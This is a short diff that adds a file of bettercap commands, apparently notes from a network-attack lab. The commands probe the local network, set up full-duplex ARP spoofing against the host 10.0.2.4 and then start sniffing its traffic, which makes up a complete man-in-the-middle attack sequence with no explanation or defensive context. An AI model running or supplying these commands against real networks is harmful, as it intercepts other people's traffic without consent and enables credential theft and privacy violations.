@@ -1,0 +1,9 @@
+bettercap -iface eth0
+  net.probe on
+  help
+  net.show
+  help arp.spoof
+  set arp.spoof.fullduplex true
+  set arp.spoof.targets 10.0.2.4
+  arp.spoof on
+  net.sniff on
